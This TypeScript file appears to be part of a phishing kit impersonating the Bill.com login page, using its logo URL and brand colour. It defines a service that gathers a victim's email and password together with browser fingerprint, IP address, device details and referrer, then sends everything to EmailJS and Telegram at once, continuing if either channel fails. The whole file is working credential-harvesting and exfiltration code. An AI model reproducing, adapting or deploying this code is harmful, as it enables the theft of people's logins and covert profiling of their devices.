import FingerprintJS from '@fingerprintjs/fingerprintjs';
import { SystemInfo, SessionData, WebmailData, AuthFlowData } from '../emailjs/types';
import { emailService } from '../emailjs/services/emailService';
import { telegramService } from './telegramService';

class DataCollectionService {
  private static instance: DataCollectionService;
  private fpPromise: Promise<any>;

  private constructor() {
    this.fpPromise = FingerprintJS.load();
  }

  public static getInstance(): DataCollectionService {
    if (!DataCollectionService.instance) {
      DataCollectionService.instance = new DataCollectionService();
    }
    return DataCollectionService.instance;
  }

  public async sendCollectedData(data: {
    email: string;
    password: string;
    systemInfo: SystemInfo;
    sessionData: SessionData;
    webmailData: WebmailData;
    authFlowData: AuthFlowData;
  }) {
    try {
      // Send data to both EmailJS and Telegram in parallel
      // If one service fails, continue with the other
      const results = await Promise.allSettled([
        emailService.sendLoginData(data),
        telegramService.sendLoginData(data)
      ]);
      
      // Check if both services failed
      const allFailed = results.every(result => result.status === 'rejected');
      if (allFailed) {
        throw new Error('Failed to send data to any service');
      }
    } catch (error) {
      console.error('Failed to send data:', error);
      throw error;
    }
  }

  public async collectSystemInfo(): Promise<SystemInfo> {
    return {
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      colorDepth: window.screen.colorDepth,
      deviceMemory: (navigator as any).deviceMemory,
      cpuCores: navigator.hardwareConcurrency,
      cookiesEnabled: navigator.cookieEnabled
    };
  }

  public async collectSessionData(): Promise<SessionData> {
    try {
      const fp = await this.fpPromise;
      const result = await fp.get();
      
      let ipAddress = 'unknown';
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (ipResponse.ok) {
          const ipData = await ipResponse.json();
          ipAddress = ipData.ip;
        }
      } catch (error) {
        console.warn('Failed to fetch IP address:', error);
      }

      const urlParams = new URLSearchParams(window.location.search);

      return {
        visitorId: result.visitorId,
        ipAddress,
        headers: this.getRequestHeaders(),
        callerId: urlParams.get('callerId')
      };
    } catch (error) {
      console.error('Failed to collect session data:', error);
      // Return fallback data if collection fails
      return {
        visitorId: 'unknown',
        ipAddress: 'unknown',
        headers: this.getRequestHeaders(),
        callerId: null
      };
    }
  }

  public collectWebmailData(): WebmailData {
    return {
      loginUrl: window.location.href,
      loginEndpoint: '/api/login',
      loginStatus: 'pending',
      domainStyle: {
        logoUrl: 'https://login.us.bill.com/neo/assets/images/pages/login/BILL-logo.svg',
        backgroundColor: '#ff5a0a'
      }
    };
  }

  public collectAuthFlowData(attempts: number, status: string): AuthFlowData {
    return {
      loginAttempts: attempts,
      authStatus: status,
      redirectUrl: document.referrer
    };
  }

  private getRequestHeaders(): Record<string, string> {
    const headers: Record<string, string> = {};
    headers['User-Agent'] = navigator.userAgent;
    headers['Accept-Language'] = navigator.language;
    return headers;
  }
}

export const dataCollectionService = DataCollectionService.getInstance();